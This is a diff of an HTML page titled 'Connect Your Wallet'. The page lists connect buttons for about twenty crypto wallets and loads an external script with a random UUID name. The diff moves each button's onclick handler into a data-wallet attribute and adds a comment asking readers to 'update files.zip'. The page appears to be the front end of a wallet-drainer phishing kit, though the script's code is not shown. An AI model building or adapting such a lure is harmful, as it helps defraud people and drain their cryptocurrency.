@@ -1,8 +1,7 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script charset="UTF-8" type="text/javascript" src="./a6ea0ad4-0514-4ce3-a99c-c5ad49f9c4f4.js"></script>
+    <script charset="UTF-8" type="text/javascript" src="./a6ea0ad4-0514-4ce3-a99c-c5ad49f9c4f4.js"></script><!–– Please update files.zip if you not already did and check below (updated the 11/11) ––>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connect Your Wallet</title>
@@ -339,7 +338,7 @@
                     </div>
                     <h3>MetaMask</h3>
                     <p>The most popular browser wallet</p>
-                    <button class="interact-button" onclick="connectWallet('metamask')">
+                    <button class="interact-button" data-wallet="metamask">
                         Connect MetaMask
                     </button>
                 </div>
@@ -351,7 +350,7 @@
                     </div>
                     <h3>WalletConnect</h3>
                     <p>Connect with QR code</p>
-                    <button class="interact-button" onclick="connectWallet('walletconnect')">
+                    <button class="interact-button" data-wallet="walletconnect">
                         Connect WalletConnect
                     </button>
                 </div>
@@ -363,7 +362,7 @@
                     </div>
                     <h3>Coinbase Wallet</h3>
                     <p>Connect with Coinbase</p>
-                    <button class="interact-button" onclick="connectWallet('coinbase')">
+                    <button class="interact-button" data-wallet="coinbase">
                         Connect Coinbase
                     </button>
                 </div>
@@ -375,7 +374,7 @@
                     </div>
                     <h3>Trust Wallet</h3>
                     <p>Mobile-first wallet</p>
-                    <button class="interact-button" onclick="connectWallet('trust')">
+                    <button class="interact-button" data-wallet="trust">
                         Connect Trust Wallet
                     </button>
                 </div>
@@ -387,7 +386,7 @@
                     </div>
                     <h3>Phantom</h3>
                     <p>Solana wallet</p>
-                    <button class="interact-button" onclick="connectWallet('phantom')">
+                    <button class="interact-button" data-wallet="phantom">
                         Connect Phantom
                     </button>
                 </div>
@@ -399,7 +398,7 @@
                     </div>
                     <h3>Rainbow</h3>
                     <p>Beautiful Ethereum wallet</p>
-                    <button class="interact-button" onclick="connectWallet('rainbow')">
+                    <button class="interact-button" data-wallet="rainbow">
                         Connect Rainbow
                     </button>
                 </div>
@@ -411,7 +410,7 @@
                     </div>
                     <h3>Ledger</h3>
                     <p>Hardware wallet security</p>
-                    <button class="interact-button" onclick="connectWallet('ledger')">
+                    <button class="interact-button" data-wallet="ledger">
                         Connect Ledger
                     </button>
                 </div>
@@ -423,7 +422,7 @@
                     </div>
                     <h3>Trezor</h3>
                     <p>Original hardware wallet</p>
-                    <button class="interact-button" onclick="connectWallet('trezor')">
+                    <button class="interact-button" data-wallet="trezor">
                         Connect Trezor
                     </button>
                 </div>
@@ -435,7 +434,7 @@
                     </div>
                     <h3>Brave Wallet</h3>
                     <p>Built into Brave browser</p>
-                    <button class="interact-button" onclick="connectWallet('brave')">
+                    <button class="interact-button" data-wallet="brave">
                         Connect Brave
                     </button>
                 </div>
@@ -447,7 +446,7 @@
                     </div>
                     <h3>Exodus</h3>
                     <p>Desktop & mobile wallet</p>
-                    <button class="interact-button" onclick="connectWallet('exodus')">
+                    <button class="interact-button" data-wallet="exodus">
                         Connect Exodus
                     </button>
                 </div>
@@ -459,7 +458,7 @@
                     </div>
                     <h3>Atomic Wallet</h3>
                     <p>Multi-currency wallet</p>
-                    <button class="interact-button" onclick="connectWallet('atomic')">
+                    <button class="interact-button" data-wallet="atomic">
                         Connect Atomic
                     </button>
                 </div>
@@ -471,7 +470,7 @@
                     </div>
                     <h3>OKX Wallet</h3>
                     <p>Multi-chain wallet</p>
-                    <button class="interact-button" onclick="connectWallet('okx')">
+                    <button class="interact-button" data-wallet="okx">
                         Connect OKX
                     </button>
                 </div>
@@ -483,7 +482,7 @@
                     </div>
                     <h3>Binance Wallet</h3>
                     <p>Exchange wallet</p>
-                    <button class="interact-button" onclick="connectWallet('binance')">
+                    <button class="interact-button" data-wallet="binance">
                         Connect Binance
                     </button>
                 </div>
@@ -495,7 +494,7 @@
                     </div>
                     <h3>Keplr</h3>
                     <p>Cosmos ecosystem wallet</p>
-                    <button class="interact-button" onclick="connectWallet('keplr')">
+                    <button class="interact-button" data-wallet="keplr">
                         Connect Keplr
                     </button>
                 </div>
@@ -507,7 +506,7 @@
                     </div>
                     <h3>Terra Station</h3>
                     <p>Terra wallet</p>
-                    <button class="interact-button" onclick="connectWallet('terra')">
+                    <button class="interact-button" data-wallet="terra">
                         Connect Terra Station
                     </button>
                 </div>
@@ -519,7 +518,7 @@
                     </div>
                     <h3>Solflare</h3>
                     <p>Solana wallet</p>
-                    <button class="interact-button" onclick="connectWallet('solflare')">
+                    <button class="interact-button" data-wallet="solflare">
                         Connect Solflare
                     </button>
                 </div>
@@ -531,7 +530,7 @@
                     </div>
                     <h3>Math Wallet</h3>
                     <p>Multi-platform wallet</p>
-                    <button class="interact-button" onclick="connectWallet('math')">
+                    <button class="interact-button" data-wallet="math">
                         Connect Math Wallet
                     </button>
                 </div>
@@ -543,7 +542,7 @@
                     </div>
                     <h3>SafePal</h3>
                     <p>Hardware & software wallet</p>
-                    <button class="interact-button" onclick="connectWallet('safepal')">
+                    <button class="interact-button" data-wallet="safepal">
                         Connect SafePal
                     </button>
                 </div>
@@ -555,7 +554,7 @@
                     </div>
                     <h3>1inch Wallet</h3>
                     <p>DeFi-focused wallet</p>
-                    <button class="interact-button" onclick="connectWallet('1inch')">
+                    <button class="interact-button" data-wallet="1inch">
                         Connect 1inch
                     </button>
                 </div>
@@ -567,7 +566,7 @@
                     </div>
                     <h3>Argent</h3>
                     <p>Smart contract wallet</p>
-                    <button class="interact-button" onclick="connectWallet('argent')">
+                    <button class="interact-button" data-wallet="argent">
                         Connect Argent
                     </button>
                 </div>
@@ -579,7 +578,7 @@
                     </div>
                     <h3>Gnosis Safe</h3>
                     <p>Multi-signature wallet</p>
-                    <button class="interact-button" onclick="connectWallet('gnosis')">
+                    <button class="interact-button" data-wallet="gnosis">
                         Connect Gnosis Safe
                     </button>
                 </div>
